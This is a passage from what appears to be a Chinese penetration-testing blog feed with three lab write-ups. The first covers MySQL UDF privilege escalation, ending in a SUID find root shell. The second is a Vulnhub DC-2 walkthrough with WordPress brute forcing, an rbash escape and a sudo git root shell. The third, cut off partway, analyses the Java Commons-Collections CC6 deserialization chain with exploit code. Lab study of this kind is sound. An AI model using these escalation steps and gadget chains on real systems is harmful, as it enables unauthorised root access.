dumpfile„ÄÅinto  outfile„ÄÅload_file() ÂáΩÊï∞Âú®Âì™‰∏™ÁõÆÂΩï‰∏ãÊã•Êúâ‰∏ä‰º†ÊàñËÄÖËØªÂèñÊñá‰ª∂ÁöÑÊùÉÈôê</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#x27;secure%&#x27;;</span><br><span class="line">     ÂΩì secure_file_priv ÁöÑÂÄº‰∏∫ NULL ÔºåË°®Á§∫ÈôêÂà∂ mysqld ‰∏çÂÖÅËÆ∏ÂØºÂÖ•|ÂØºÂá∫ÔºåÊ≠§Êó∂Êó†Ê≥ïÊèêÊùÉ</span><br><span class="line">     ÂΩì secure_file_priv ÁöÑÂÄº‰∏∫ /tmp/ ÔºåË°®Á§∫ÈôêÂà∂ mysqld ÁöÑÂØºÂÖ•|ÂØºÂá∫Âè™ËÉΩÂèëÁîüÂú® /tmp/ ÁõÆÂΩï‰∏ãÔºåÊ≠§Êó∂ÂèØËÉΩ‰πüÊó†Ê≥ïÊèêÊùÉ</span><br><span class="line">     ÂΩì secure_file_priv ÁöÑÂÄºÊ≤°ÊúâÂÖ∑‰ΩìÂÄºÊó∂ÔºåË°®Á§∫‰∏çÂØπ mysqld ÁöÑÂØºÂÖ•|ÂØºÂá∫ÂÅöÈôêÂà∂ÔºåÊ≠§Êó∂ÂèØÊèêÊùÉ</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301515020.png" alt="image-20230530151509989"><br>ÂèØ‰ª•‰ΩøÁî®udfÊèêÊùÉÔºåÂπ∂‰∏îÂØºÂá∫Ê≤°ÂÅöÈôêÂà∂Ôºåkali‰ΩøÁî®ÂëΩ‰ª§<code>searchsploit mysql</code> ÊâæÂà∞Âà©Áî®exp<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301515647.png" alt="image-20230530151520614"><br>Â∞ÜexpÂ§çÂà∂ÁîüÊàê<code>.so</code>Êñá‰ª∂</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/local/1518.c //home/joker27/Ê°åÈù¢</span><br><span class="line">gcc -g -c 1518.c</span><br><span class="line">gcc -g -shared -o udf.so 1518.o -lc</span><br><span class="line"></span><br><span class="line">ÂèÇÊï∞Âê´‰πâ</span><br><span class="line">-g ÁîüÊàêË∞ÉËØï‰ø°ÊÅØ</span><br><span class="line">-c ÁºñËØëÔºà‰∫åËøõÂà∂Ôºâ</span><br><span class="line">-sharedÔºöÂàõÂª∫‰∏Ä‰∏™Âä®ÊÄÅÈìæÊé•Â∫ìÔºåËæìÂÖ•Êñá‰ª∂ÂèØ‰ª•ÊòØÊ∫êÊñá‰ª∂„ÄÅÊ±áÁºñÊñá‰ª∂ÊàñËÄÖÁõÆÊ†áÊñá‰ª∂„ÄÇ</span><br><span class="line">-oÔºöÊâßË°åÂëΩ‰ª§ÂêéÁöÑÊñá‰ª∂Âêç</span><br><span class="line">-lcÔºö-l Â∫ì cÂ∫ìÂêç</span><br></pre></td></tr></table></figure><p>ÂêåÊ†∑Áî®pythonÁöÑ‰∏¥Êó∂ÊúçÂä°Â∞Ü<code>.so</code>Êñá‰ª∂‰∏ä‰º†Âà∞Èù∂Êú∫ÔºåÊé•‰∏ãÊù•ÁöÑÊ≠•È™§Â∞±ÊòØËá™ÂÆö‰πâ‰∏Ä‰∏™ÂáΩÊï∞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">use mysql</span><br><span class="line"></span><br><span class="line">//ÂàõÂª∫‰∏Ä‰∏™Ë°®Âπ∂‰∏îÂåÖÂê´‰∏Ä‰∏™blobÂûã(blobÂûãÁî®‰∫éÂÇ®Â≠òÂ§ßÂûã‰∫åËøõÂà∂ÂØπË±°)ÁöÑÂàó</span><br><span class="line">create table foo(line blob);</span><br><span class="line"></span><br><span class="line">//Â∞Üudf.soÊñá‰ª∂ÊèíÂÖ•Ë°®‰∏≠</span><br><span class="line">insert into foo values(load_file(&#x27;/var/www/html/udf.so&#x27;));</span><br><span class="line"></span><br><span class="line">//Â∞Ü‰∫åËøõÂà∂Êï∞ÊçÆÂØºÂá∫Âà∞pluginÁõÆÂΩï‰∏ã</span><br><span class="line">select * from foo into dumpfile &#x27;/usr/lib/mysql/plugin/udf.so&#x27;;</span><br><span class="line"></span><br><span class="line">//ÂàõÂª∫Ëá™ÂÆö‰πâÂáΩÊï∞do_systemÔºåÁ±ªÂûã‰∏∫integerÔºåÂà´Âêçudf.so</span><br><span class="line">create function do_system returns integer soname &#x27;udf.so&#x27;;</span><br><span class="line"></span><br><span class="line">//Êü•ËØ¢ÊòØÂê¶ÂàõÂª∫ÊàêÂäü</span><br><span class="line">select * from mysql.func;</span><br><span class="line"></span><br><span class="line">//Âà©Áî®Ëá™ÂÆö‰πâÂáΩÊï∞ÊîπÂèòfindÂëΩ‰ª§ÊùÉÈôê</span><br><span class="line">select do_system(&#x27;chmod u+s /usr/bin/find&#x27;);</span><br><span class="line"></span><br><span class="line">//‰ΩøÁî®findÊèêÊùÉ</span><br><span class="line">touch hello</span><br><span class="line">find hello -exec &quot;/bin/sh&quot; \;</span><br></pre></td></tr></table></figure><p>zËøôÈáåÂÜçÊ∏©‰π†‰∏ÄÈÅçfindÊèêÊùÉÔºåÂ∞±ÊòØÈöè‰æøÊü•Êâæ‰∏Ä‰∏™Êñá‰ª∂ÔºåÂΩìÁÑ∂Ëøô‰∏™Êñá‰ª∂ÂæóÂ≠òÂú®ÔºåÂØπÊü•ÊâæÂà∞ÁöÑÂà©Áî®ÂèÇÊï∞<code>-exec</code>ÊâßË°å‰∏Ä‰∏™shellÂëΩ‰ª§ÔºåÁî±‰∫éfindÊòØ‰ª•rootËøêË°åÁöÑÊâÄ‰ª•Ëøô‰∏™shellËá™ÁÑ∂‰πüÂ∞±ÊòØroot‰∫Ü<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301515774.png" alt="image-20230530151533731"><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301515043.png"></p>]]></content>
      
      
      <categories>
          
          <category> Ê∏óÈÄè </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-DC-2</title>
      <link href="/2023/05/Vulnhub-DC-2/"/>
      <url>/2023/05/Vulnhub-DC-2/</url>
      
        <content type="html"><![CDATA[<h2 id="ÁéØÂ¢ÉÊê≠Âª∫"><a href="#ÁéØÂ¢ÉÊê≠Âª∫" class="headerlink" title="ÁéØÂ¢ÉÊê≠Âª∫"></a>ÁéØÂ¢ÉÊê≠Âª∫</h2><p>‰∏ãËΩΩÂú∞ÂùÄÔºö<a href="https://www.vulnhub.com/entry/dc-2,311/">https://www.vulnhub.com/entry/dc-2,311/</a><br>‰∏ãËΩΩÂÆåÂêéÂ∞±‰∏Ä‰∏™ovaÊñá‰ª∂ÔºåVmwareÊâìÂºÄÂ∞±Ë°å</p><h2 id="flag‚Äì1"><a href="#flag‚Äì1" class="headerlink" title="flag‚Äì1"></a>flag‚Äì1</h2><p>ËÄÅÊ≠•È™§ÔºåÊâ´ÊèèÂ≠òÊ¥ªIP<br><code>arp-scan -l</code><br>ÈÄöËøámacÂú∞ÂùÄÂà§Êñ≠IP‰∏∫192.168.75.134<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071823280.png" alt="image-20230507182024787"><br>nmapÊü•ÁúãÂÖ®ÈÉ®Á´ØÂè£Ôºå-v‰∏∫Êü•ÁúãÁâàÊú¨Âè∑<br><code>nmap -A -p- -v 192.168.75.134</code><br>Êúâ‰∏Ä‰∏™80Á´ØÂè£ÔºåËøòÊúâ‰∏Ä‰∏™7744Êîæ‰∫Üssh<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071824518.png" alt="image-20230507182437450"><br>ËÆøÈóÆIPÁöÑÊó∂ÂÄôÂèëÁé∞ËÆøÈóÆÂ§±Ë¥•ÔºåÂπ∂‰∏îÈáçÂÆöÂêëÂà∞ÂüüÂêç<code>dc-2</code>ÂéüÂõ†‰∏∫Êú¨Âú∞Êó†Ê≥ïËß£ÊûêÂüüÂêçÔºåÊâÄ‰ª•ÈúÄË¶ÅÁºñËæë&#x2F;etc&#x2F;hostsÊñá‰ª∂ÔºåÊ∑ªÂä†Èù∂Êú∫IPÂú∞ÂùÄÂèäÂØπÂ∫îÂüüÂêç</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br><span class="line">192.168.75.134  dc-2</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071824150.png" alt="image-20230507182457099"><br>Áî±‰∫éÊòØÂú®kali‰∏ãÂÜôÂÖ•ÊâÄ‰ª•Âè™ËÉΩÂú®kali‰∏ãËÆøÈóÆÔºåÁÑ∂ÂêéÂú®È°µÈù¢ÊâæÂà∞flag1<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071825846.png" alt="image-20230507182506788"><br>ÁÑ∂ÂêéÊ†πÊçÆÊèêÁ§∫‰∏ã‰∏Ä‰∏™flagË¶Å‰ΩøÁî®kali‰∏ãÁöÑcewlÔºåÂπ∂‰∏îÈúÄË¶ÅÁôªÂΩïÔºåÊâÄ‰ª•ÂæÖ‰ºöÂÑøË¶ÅÊâ´‰∏Ä‰∏ãÁõÆÂΩï</p><h2 id="flag‚Äì2"><a href="#flag‚Äì2" class="headerlink" title="flag‚Äì2"></a>flag‚Äì2</h2><p>ÂÖà‰ΩøÁî®cewlÁîüÊàê‰∏Ä‰∏ãÂØÜÁ†ÅÂ≠óÂÖ∏<br><code>cewl dc-2 -w dict.txt</code><br>ÁÑ∂Âêé‰ΩøÁî®WPscanÊûö‰∏æ‰∏Ä‰∏ãÁî®Êà∑<br><code>wpscan --url dc-2 --enumerate u</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071825397.png" alt="image-20230507182519333"><br>ÂæóÂà∞‰∏â‰∏™Áî®Êà∑ÔºåÁÑ∂Âêé‰ΩøÁî®‰∏ÄÂºÄÂßãÁîüÊàêÁöÑÂ≠óÂÖ∏ËøõË°åÁàÜÁ†¥<br><code>wpscan --url dc-2 --passwords dict.txt</code><br>ÂæóÂà∞‰∏§‰∏™Ë¥¶Âè∑ÁöÑÂØÜÁ†Å<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071825746.png" alt="image-20230507182535717"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username: jerry, Password: adipiscing</span><br><span class="line">Username: tom, Password: parturient</span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéÊâ´‰∏Ä‰∏ãÂêéÂè∞<code>dirb http://dc-2/ </code>ÂæóÂà∞ÁôªÂΩïÂú∞ÂùÄ‰∏∫&#x2F;wp-adminÔºåÂà©Áî®Ë¥¶Âè∑ÁôªÂΩïÊâæÂà∞flag2<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071825804.png" alt="image-20230507182547769"></p><h2 id="flag‚Äì3"><a href="#flag‚Äì3" class="headerlink" title="flag‚Äì3"></a>flag‚Äì3</h2><p>ÁÑ∂ÂêéÂà©Áî®‰∏Ä‰∏ã‰πãÂâçÊâ´ÁöÑsshÊúçÂä°ÔºåÁî®tomÁöÑË¥¶Âè∑Áôª‰∏Ä‰∏ã<br><code>ssh tom@192.168.75.134 -p 7744</code>ÂØÜÁ†ÅÂ∞±ÊòØ‰πãÂâçÈÇ£‰∏™ÂØÜÁ†ÅÔºåÁÑ∂ÂêélsÂèØ‰ª•ÁúãÂà∞flagÔºå‰ΩÜÊòØËøôÈáåÂÅö‰∫ÜrbashÈôêÂà∂ÔºåÊúÄÁªà‰ΩøÁî®viÊâìÂºÄÂæóÂà∞flag3<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071826231.png" alt="image-20230507182601203"></p><h2 id="flag‚Äì4"><a href="#flag‚Äì4" class="headerlink" title="flag‚Äì4"></a>flag‚Äì4</h2><p>Ê†πÊçÆflag3ÊèêÁ§∫ÂàáÊç¢Âà∞Âè¶‰∏Ä‰∏™Áî®Êà∑Ôºå‰ΩÜÊòØËøôÈáåÁî®‰∏ç‰∫ÜsuÂëΩ‰ª§ÔºåÁî®‰∫ÜrbashÂåÖË£πÂæóÁªïËøá‰∏Ä‰∏ã<br>ÂÖàÁÆÄÂçïÁúã‰∏Ä‰∏ãrbashÊòØ‰ªÄ‰πà</p><h3 id="rbash"><a href="#rbash" class="headerlink" title="rbash"></a>rbash</h3><p>rbash(The restricted mode of bash),‰πüÂ∞±ÊòØÈôêÂà∂ÂûãbashÔºõÊòØÂπ≥Êó∂ÊâÄË∞ìÁöÑ restricted shellÁöÑ‰∏ÄÁßçÔºå‰πüÊòØÊúÄÂ∏∏ËßÅÁöÑ restricted shellÔºàrbash„ÄÅksh„ÄÅrshÁ≠âÔºâÊ∏óÈÄè‰∏≠ÈÅáÂà∞restricted shellÊòØ‰∏Ä‰ª∂ÂæàÁÉ¶‰∫∫ÁöÑ‰∫ãÔºåÊÄªÊúâÊúâ‰∏ÄÁßçÊùüÊâãÊùüËÑöÁöÑÊÑüËßâÔºõ‰∏ãÈù¢Êàë‰ª¨Â∞±Êù•ÁúãÁúãÂ¶Ç‰ΩïÁ™ÅÁ†¥ÂÆÉ„ÄÇ</p><h3 id="0x01„ÄÅrbash‰∏≠ÁöÑÈôêÂà∂ÔºàÊ≠£Âõ†‰∏∫ÊúâËøô‰∫õÈôêÂà∂Êàë‰ª¨ÊâçË¶ÅÁ™ÅÁ†¥ÂÆÉÔºâ"><a href="#0x01„ÄÅrbash‰∏≠ÁöÑÈôêÂà∂ÔºàÊ≠£Âõ†‰∏∫ÊúâËøô‰∫õÈôêÂà∂Êàë‰ª¨ÊâçË¶ÅÁ™ÅÁ†¥ÂÆÉÔºâ" class="headerlink" title="0x01„ÄÅrbash‰∏≠ÁöÑÈôêÂà∂ÔºàÊ≠£Âõ†‰∏∫ÊúâËøô‰∫õÈôêÂà∂Êàë‰ª¨ÊâçË¶ÅÁ™ÅÁ†¥ÂÆÉÔºâ"></a>0x01„ÄÅrbash‰∏≠ÁöÑÈôêÂà∂ÔºàÊ≠£Âõ†‰∏∫ÊúâËøô‰∫õÈôêÂà∂Êàë‰ª¨ÊâçË¶ÅÁ™ÅÁ†¥ÂÆÉÔºâ</h3><ul><li>‰∏çËÉΩ‰ΩøÁî®cdÂëΩ‰ª§ÔºàÊÑèÂë≥ÁùÄ‰∏çËÉΩÊõ¥ÊîπÁõÆÂΩïÔºâ</li><li>‰∏çËÉΩËÆæÁΩÆÊàñÂèñÊ∂àÁéØÂ¢ÉÂèòÈáèÔºöSHELLÔºå PATHÔºå ENVÔºå BASH_ENV</li><li>ÂØºÂÖ•ÂäüËÉΩÂèóÈôê</li><li>ÊåáÂÆöÂåÖÂê´ÂèÇÊï∞‚Äô&#x2F;‚ÄòÊàñ‚Äô-‚ÄòÁöÑÊñá‰ª∂Âêç(Âç≥ÂëΩÂêç‰∏≠‰∏çËÉΩÂåÖÂê´ ‚Äò&#x2F; ‚Äò Êàñ‚Äô-‚Äò)</li><li>‰∏çËÉΩ‰ΩøÁî®‰ΩøÁî® &gt;Ôºå&gt;|Ôºå &lt;&gt;Ôºå &gt;&amp;Ôºå &amp;&gt;Ôºå &gt;&gt; Á≠âÈáçÂÆöÂêëÊìç‰ΩúÁ¨¶</li><li>‰∏çËÉΩ‰ΩøÁî®‚Äôset + r‚ÄôÊàñ‚Äôset + o‚ÄôÂÖ≥Èó≠<br>‰ªé‰∏äËæπËøô‰∫õÈôêÂà∂ÂèØÁü•rbashÁöÑÂ≠òÂú®ÊòØ‰∏∫‰∫ÜÊèêÈ´òÂÆâÂÖ®ÊÄßÔºå‰ΩÜÊòØ‰∏•ÈáçÂΩ±Âìç‰∫ÜÊàë‰ª¨Âú®ÁõÆÊ†áÊú∫Âô®‰∏äÁöÑ‰ø°ÊÅØÊî∂ÈõÜÔºå‰ª•ÂèäÂ∏∏Áî®ÁöÑÂèçÂºπshell(Â§ßÈÉ®ÂàÜÈúÄË¶ÅÁî®Âà∞ÈáçÂÆöÂêëÁ¨¶)<br>ËøôÈáåÁªïËøáÊñπÊ≥ïÂæàÂ§öÔºåÊàëÁõ¥Êé•Áî®wpÁöÑÊñπÊ≥ï<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/sh  #Ë∞ÉÁî®/bin/shÂëΩ‰ª§Ëß£ÈáäÂô®</span><br><span class="line">a  </span><br><span class="line">/bin/bash   #‰ΩøÁî®bashÂëΩ‰ª§Ëß£ÈáäÂô®</span><br><span class="line">export PATH=PATH:/bin:/sbin:/usr/bin:/usr/sbin  #ËÆæÁΩÆÁéØÂ¢ÉÂèòÈáè</span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071826226.png" alt="image-20230507182618182"><br>ÂàáÊç¢ÊàêÂäüÔºåÁÑ∂ÂêéËøõÂÖ•jerryÁõÆÂΩï‰∏ãÂæóÂà∞flag4<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071826271.png" alt="image-20230507182628216"></li></ul><h2 id="flag‚Äì5"><a href="#flag‚Äì5" class="headerlink" title="flag‚Äì5"></a>flag‚Äì5</h2><p>ÈÄöËøáflag4ÊèêÁ§∫‰ΩøÁî®gitÊèêÊùÉ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo -l    #Êü•ÁúãÂèØ‰ª•‰ΩøÁî®rootÊùÉÈôêÊó†ÂØÜÁ†ÅÁöÑÂëΩ‰ª§ÔºåÊúâgitÂëΩ‰ª§</span><br><span class="line">sudo git -p help #Âº∫Âà∂ËøõÂÖ•‰∫§‰∫íÁä∂ÊÄÅ</span><br><span class="line">!/bin/bash #ÊâìÂºÄ‰∏Ä‰∏™Áî®Êà∑‰∏∫rootÁöÑshell</span><br><span class="line"></span><br><span class="line">Ê≥ï2Ôºö</span><br><span class="line">sudo git help config #Âú®Êú´Ë°åÂëΩ‰ª§Ê®°ÂºèËæìÂÖ•</span><br><span class="line">!/bin/bash ÊàñËÄÖ !&#x27;sh&#x27; #ÊâìÂºÄ‰∏Ä‰∏™Áî®Êà∑‰∏∫rootÁöÑshell</span><br></pre></td></tr></table></figure><p>ÊèêÊùÉÊàêÂäüÔºåÊãøÂà∞ÊúÄÂêé‰∏Ä‰∏™flag<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071826622.png" alt="image-20230507182637547"></p>]]></content>
      
      
      <categories>
          
          <category> Ê∏óÈÄè </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JavaÂ≠¶‰π†‰πãCCÈìæ6</title>
      <link href="/2023/05/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BCC%E9%93%BE6/"/>
      <url>/2023/05/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BCC%E9%93%BE6/</url>
      
        <content type="html"><![CDATA[<h2 id="ÁéØÂ¢ÉÂáÜÂ§á"><a href="#ÁéØÂ¢ÉÂáÜÂ§á" class="headerlink" title="ÁéØÂ¢ÉÂáÜÂ§á"></a>ÁéØÂ¢ÉÂáÜÂ§á</h2><p>Âü∫Êú¨‰∏äÂíåCC1Â∑Æ‰∏çÂ§ö</p><blockquote><p>jdk8u71<br>Comoons-Collections 3.2.1</p></blockquote><h2 id="ÂºÄÂßãÂàÜÊûê"><a href="#ÂºÄÂßãÂàÜÊûê" class="headerlink" title="ÂºÄÂßãÂàÜÊûê"></a>ÂºÄÂßãÂàÜÊûê</h2><p>ÂâçÂçäÊÆµÈìæÂ≠êÔºå<code>LazyMap</code> Á±ªÂà∞ <code>InvokerTransformer</code> Á±ªÊòØ‰∏ÄÊ†∑ÁöÑÔºåÊâÄ‰ª•Áõ¥Êé•Âà∞ <code>LazyMap</code> ‰∏ãÔºåËøôÈáåÂÖàÈáçÊñ∞‰∏ÄËæπLazyMap Á±ªË∞ÉÁî®ËÆ°ÁÆóÂô®ÁöÑ EXPÔºåÁúãÂèÇËÄÉÂçöÂÆ¢ËØ¥Â§öÂÜôÊúâÂà©‰∫éÊØîÈÇ£‰∫õEXPÁ°ÆÂÆûÊòØËøôÊ†∑ÔºåËÉΩÂä†Ê∑±ÁêÜËß£ÔºåÂèçÊ≠£Ê≤°ÂùèÂ§ÑÔºåÂπ∂‰∏îÊàëÂèëÁé∞Ëá™Â∑±ÂèàÊúâÁÇπÂøòËÆ∞‰∫Ü„ÄÇ„ÄÇ„ÄÇ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();  </span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> LazyMap.decorate(hashMap, invokerTransformer);  </span><br><span class="line">        Class&lt;LazyMap&gt; mapClass = LazyMap.class;  </span><br><span class="line">        <span class="type">Method</span> <span class="variable">classDeclaredMethod</span> <span class="operator">=</span> mapClass.getDeclaredMethod(<span class="string">&quot;get&quot;</span>, Object.class);  </span><br><span class="line">        classDeclaredMethod.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        classDeclaredMethod.invoke(map,r);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÈáå‰∏ã‰∏ÄÊ≠•Â∞±ÊòØÁªßÁª≠ÊâæÂì™ÈáåË∞ÉÁî®‰∫ÜgetÊñπÊ≥ïÔºåÁúã‰∫ÜÂà©Áî®ÈìæÔºå‰∏ã‰∏Ä‰∏™Á±ªÂíåÊñπÊ≥ïÊòØ<code>TiedMapEntry</code> Á±ª‰∏≠ÁöÑ <code>getValue()</code>ÊñπÊ≥ïÔºåËøô‰∏™ÈáåÈù¢Ë∞ÉÁî®‰∫Ü <code>LazyMap</code> ÁöÑ <code>get()</code> ÊñπÊ≥ïÔºåÁÑ∂ÂêéÁªßÁª≠ÁºñÂÜôEXPÁ°Æ‰øùÁõÆÂâçÈìæÂ≠êÂèØÁî®</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);  </span><br><span class="line">        <span class="comment">//‰º†ÂÖ•LazyMapÂ∞±ÂíåÂêéÈù¢ËøûËµ∑Êù•‰∫ÜÔºåÂç≥Ë∞ÉÁî®ÁöÑÊòØLazyMapÁöÑgetÊñπÊ≥ï  </span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;key&quot;</span>);  </span><br><span class="line">        tiedMapEntry.getValue();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÂºπÂá∫ÊàêÂäü<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071430104.png" alt="image-20230507143003991"><br>ÁÑ∂ÂêéÂ∞±ÊòØÁªßÁª≠ÂæÄ‰∏äÊâæÔºåÁúãË∞ÅË∞ÉÁî®‰∫Ü <code>TiedMapEntry</code> ‰∏≠ÁöÑ <code>getValue()</code> ÊñπÊ≥ïÔºåËøô‰∏™ÊñπÊ≥ïÊØîËæÉÂ∏∏ËßÅÔºåÊâÄ‰ª•Â∞±ÊòØÂÖàÁúãÂêåÁ±ª‰∏ãÊúâÊ≤°ÊúâË∞ÉÁî®ÔºåÊúÄÂêéÂèëÁé∞ÂêåÁ±ª‰∏ãÁöÑhashCodeÊñπÊ≥ïË∞ÉÁî®‰∫Ü<code>getValue()</code> ÊñπÊ≥ï<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071430087.png" alt="image-20230507143025027"><br>ËÄåÊâæÂà∞hashCodeÊñπÊ≥ïÂêéÂ∞±ÊòØÊâæË∞ÅË∞ÉÁî®‰∫ÜhashCodeÊñπÊ≥ïÔºå‰ΩÜÊòØËøôÈáåÊàë‰ª¨‰∏çÁî®ÁªßÁª≠Êâæ‰∫ÜÔºåÂõ†‰∏∫Âú®JavaÂèçÂ∫èÂàóÂåñ‰∏≠hashCodeÊñπÊ≥ïÂêéÈù¢ÁöÑÂà©Áî®ÈìæÂü∫Êú¨ÈÉΩÊòØ‰∏ãÈù¢ËøôÊù°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xxx.readObject()</span><br><span class="line">HashMap.put() --Ëá™Âä®Ë∞ÉÁî®--&gt;   HashMap.hash()</span><br><span 